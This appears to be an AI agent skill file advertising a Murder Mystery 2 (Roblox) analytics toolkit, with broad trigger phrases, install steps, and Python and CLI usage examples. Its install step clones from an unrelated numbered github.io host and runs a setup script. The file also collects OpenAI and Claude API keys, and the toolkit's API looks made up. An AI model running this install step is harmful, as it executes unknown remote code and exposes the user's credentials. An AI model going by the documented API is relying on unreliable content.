---
name: mm2-roblox-analytics-toolkit
description: Murder Mystery 2 analytics dashboard for tracking inventory, gameplay statistics, and strategy optimization in Roblox
triggers:
  - analyze my Murder Mystery 2 inventory
  - track MM2 knife skins and statistics
  - set up Roblox MM2 analytics dashboard
  - optimize my Murder Mystery 2 gameplay
  - export MM2 inventory data
  - configure roblox game analytics
  - generate MM2 strategy insights
  - parse Murder Mystery 2 game data
---

# MM2 Roblox Analytics Toolkit

> Skill by [ara.so](https://ara.so) — Data Skills collection.

An advanced analytical toolkit for Roblox's Murder Mystery 2 that provides inventory management, gameplay statistics tracking, strategy analysis, and data visualization capabilities.

## What It Does

This toolkit enables data-driven analysis of Murder Mystery 2 gameplay through:

- **Inventory Management**: Track knife skins, gamepasses, and collection completeness
- **Analytics Dashboard**: Visualize win/loss ratios, role performance, and gameplay patterns
- **Strategy Analysis**: AI-powered insights for improving gameplay tactics
- **Data Export**: Export statistics in CSV, JSON, and other formats
- **Cross-Platform Support**: Works on Windows, macOS, Linux, and web browsers

## Installation

### Prerequisites

- Python 3.8+
- Node.js 16+ (for web interface)
- Git

### Standard Installation

```bash
# Clone the repository
git clone https://8015238355.github.io mm2-analytics
cd mm2-analytics

# Install Python dependencies
pip install -r requirements.txt

# Install Node.js dependencies (for web UI)
npm install

# Run setup script
chmod +x setup.sh
./setup.sh --install
```

### Environment Configuration

Create a `.env` file:

```bash
API_OPENAI_KEY=${OPENAI_API_KEY}
API_CLAUDE_KEY=${CLAUDE_API_KEY}
DATA_DIRECTORY=./data/collections
ANALYTICS_INTERVAL=300
ENABLE_LIVE_TRACKING=true
LOG_LEVEL=INFO
```

## Core Commands

### CLI Usage

```bash
# Start analytics engine
python3 main.py --mode analytics --profile <profile_name>

# Export inventory data
python3 main.py --mode export --format json --output inventory_export.json

# Run strategy analysis
python3 main.py --mode strategy --role sheriff --verbose

# Start web dashboard
npm run start-dashboard

# Scan for new inventory items
python3 main.py --mode scan --refresh-cache
```

### Command Options

```bash
# Full command structure
python3 main.py \
  --mode {analytics|export|strategy|scan} \
  --profile <profile_name> \
  --format {json|csv|yaml} \
  --output <filename> \
  --verbose \
  --log-level {DEBUG|INFO|WARNING|ERROR}
```

## Configuration

### Profile Configuration (YAML)

Create `profiles/<username>.yaml`:

```yaml
profile:
  username: "PlayerName123"
  preferred_role: "sheriff"
  
  inventory_filter:
    - category: "knife_skins"
      rarity: ["legendary", "ancient", "godly"]
    - category: "gun_skins"
      rarity: ["legendary"]
    - category: "gamepasses"
      active: true
  
  analytics_preferences:
    tracking_mode: "comprehensive"
    data_refresh_rate: 30
    export_format: ["csv", "json"]
    include_timestamps: true
  
  strategy_templates:
    - name: "aggressive_sheriff"
      priority: "high_visibility_areas"
      engagement_rate: "high"
    - name: "passive_innocent"
      priority: "distraction_avoidance"
      survival_focus: true
    - name: "stealth_murderer"
      priority: "isolated_targets"
      knife_throw_conservation: true
```

### Data Directory Structure

```
data/
├── collections/
│   ├── knife_skins.json
│   ├── gun_skins.json
│   └── gamepasses.json
├── analytics/
│   ├── gameplay_stats.db
│   └── session_logs.csv
└── exports/
    ├── inventory_2026.json
    └── statistics_2026.csv
```

## Python API Usage

### Import and Initialize

```python
from mm2_analytics import AnalyticsEngine, InventoryManager, StrategyAnalyzer
import os

# Initialize with environment variables
engine = AnalyticsEngine(
    api_key=os.getenv("API_OPENAI_KEY"),
    data_dir=os.getenv("DATA_DIRECTORY", "./data")
)

# Create profile
profile = engine.create_profile(
    username="PlayerName123",
    preferred_role="sheriff"
)
```

### Inventory Management

```python
from mm2_analytics.inventory import InventoryManager

# Initialize inventory manager
inventory = InventoryManager(profile=profile)

# Scan for items
items = inventory.scan_collection()
print(f"Found {len(items)} items")

# Filter by rarity
legendary_knives = inventory.filter_items(
    category="knife_skins",
    rarity=["legendary", "ancient"]
)

# Get collection statistics
stats = inventory.get_statistics()
print(f"Collection value: {stats['total_value']}")
print(f"Completion rate: {stats['completion_percentage']}%")

# Export inventory
inventory.export(
    format="json",
    output_path="./exports/inventory_snapshot.json",
    include_metadata=True
)
```

### Analytics and Statistics

```python
from mm2_analytics.analytics import GameplayAnalytics

# Initialize analytics
analytics = GameplayAnalytics(profile=profile)

# Load session data
analytics.load_sessions(start_date="2026-01-01", end_date="2026-05-16")

# Get role performance
sheriff_stats = analytics.get_role_statistics("sheriff")
print(f"Win rate: {sheriff_stats['win_rate']:.2%}")
print(f"Average survival time: {sheriff_stats['avg_survival_time']:.1f}s")

# Analyze gameplay patterns
patterns = analytics.identify_patterns(
    role="murderer",
    min_confidence=0.75
)

for pattern in patterns:
    print(f"Pattern: {pattern['name']}")
    print(f"Success rate: {pattern['success_rate']:.2%}")
    print(f"Recommendation: {pattern['recommendation']}")
```

### Strategy Analysis

```python
from mm2_analytics.strategy import StrategyAnalyzer

# Initialize strategy analyzer
strategy = StrategyAnalyzer(
    profile=profile,
    ai_api_key=os.getenv("API_CLAUDE_KEY")
)

# Get AI-powered recommendations
recommendations = strategy.analyze_performance(
    role="sheriff",
    recent_sessions=10
)

print(recommendations['summary'])
for tip in recommendations['tips']:
    print(f"- {tip}")

# Simulate strategy outcomes
simulation = strategy.simulate_strategy(
    template="aggressive_sheriff",
    iterations=1000
)

print(f"Predicted win rate: {simulation['win_rate']:.2%}")
print(f"Risk assessment: {simulation['risk_level']}")
```

### Data Visualization

```python
from mm2_analytics.visualization import DashboardGenerator

# Create dashboard
dashboard = DashboardGenerator(profile=profile)

# Generate charts
dashboard.create_win_loss_chart(
    role="sheriff",
    output="charts/sheriff_performance.png"
)

dashboard.create_inventory_value_timeline(
    output="charts/inventory_value.png"
)

dashboard.create_strategy_heatmap(
    role="murderer",
    metric="kill_locations",
    output="charts/murderer_heatmap.png"
)

# Export interactive HTML dashboard
dashboard.export_html(output="dashboard.html")
```

## Common Patterns

### Complete Analysis Workflow

```python
import os
from mm2_analytics import AnalyticsEngine

# Setup
engine = AnalyticsEngine(
    api_key=os.getenv("API_OPENAI_KEY"),
    data_dir="./data"
)

profile = engine.load_profile("PlayerName123")

# 1. Scan inventory
inventory = engine.inventory_manager(profile)
items = inventory.scan_collection()
inventory.export(format="json", output_path="./exports/inventory.json")

# 2. Load gameplay analytics
analytics = engine.analytics(profile)
analytics.load_sessions(days=30)

# 3. Generate statistics
stats = {
    "sheriff": analytics.get_role_statistics("sheriff"),
    "innocent": analytics.get_role_statistics("innocent"),
    "murderer": analytics.get_role_statistics("murderer")
}

# 4. Get strategy recommendations
strategy = engine.strategy_analyzer(profile)
recommendations = strategy.analyze_performance(role="sheriff")

# 5. Export comprehensive report
engine.export_report(
    stats=stats,
    recommendations=recommendations,
    output="./exports/monthly_report.pdf"
)
```

### Real-time Tracking

```python
from mm2_analytics.tracking import LiveTracker

# Initialize live tracker
tracker = LiveTracker(
    profile=profile,
    update_interval=30  # seconds
)

# Start tracking
tracker.start()

# Register event callbacks
@tracker.on_game_start
def handle_game_start(event):
    print(f"Game started - Role: {event['role']}")

@tracker.on_game_end
def handle_game_end(event):
    print(f"Game ended - Result: {event['result']}")
    print(f"Duration: {event['duration']}s")

# Run until interrupted
try:
    tracker.run()
except KeyboardInterrupt:
    tracker.stop()
    tracker.save_session()
```

### Batch Data Export

```python
from mm2_analytics.export import BatchExporter
from datetime import datetime

# Initialize exporter
exporter = BatchExporter(profile=profile)

# Define export configuration
export_config = {
    "inventory": {
        "format": "json",
        "include_metadata": True
    },
    "statistics": {
        "format": "csv",
        "date_range": "last_30_days"
    },
    "sessions": {
        "format": "json",
        "include_details": True
    }
}

# Execute batch export
timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
results = exporter.batch_export(
    config=export_config,
    output_dir=f"./exports/batch_{timestamp}"
)

print(f"Exported {len(results)} files")
for file in results:
    print(f"- {file}")
```

## Troubleshooting

### Common Issues

**Issue: "Profile not found" error**

```python
# Solution: Create profile first
from mm2_analytics import AnalyticsEngine

engine = AnalyticsEngine(data_dir="./data")
profile = engine.create_profile(
    username="NewPlayer",
    preferred_role="innocent"
)
profile.save()
```

**Issue: Missing data directory**

```bash
# Create required directories
mkdir -p data/{collections,analytics,exports}
mkdir -p profiles
mkdir -p charts
```

**Issue: API rate limiting**

```python
# Configure retry logic and backoff
from mm2_analytics import AnalyticsEngine

engine = AnalyticsEngine(
    api_key=os.getenv("API_OPENAI_KEY"),
    rate_limit_delay=1.0,  # seconds between requests
    max_retries=3
)
```

**Issue: Large dataset performance**

```python
# Use pagination for large queries
analytics = GameplayAnalytics(profile=profile)

# Process in batches
batch_size = 100
offset = 0

while True:
    sessions = analytics.load_sessions(
        limit=batch_size,
        offset=offset
    )
    
    if not sessions:
        break
    
    # Process batch
    for session in sessions:
        process_session(session)
    
    offset += batch_size
```

**Issue: Corrupted cache**

```bash
# Clear cache and rescan
python3 main.py --mode scan --clear-cache --rebuild-index
```

### Debug Mode

```python
import logging
from mm2_analytics import AnalyticsEngine

# Enable debug logging
logging.basicConfig(level=logging.DEBUG)

engine = AnalyticsEngine(
    data_dir="./data",
    debug_mode=True,
    log_file="./logs/debug.log"
)

# Verbose operations
engine.verbose = True
```

### Validation

```python
from mm2_analytics.validation import DataValidator

# Validate inventory data
validator = DataValidator()

issues = validator.validate_inventory(
    inventory_file="./data/collections/knife_skins.json"
)

if issues:
    print("Validation issues found:")
    for issue in issues:
        print(f"- {issue['severity']}: {issue['message']}")
else:
    print("Data validation passed")
```

## Best Practices

1. **Always use environment variables** for API keys
2. **Regular backups** of data directory
3. **Profile-specific configurations** for multiple accounts
4. **Batch operations** for large datasets
5. **Rate limiting** when using AI APIs
6. **Error handling** for network operations
7. **Data validation** before processing
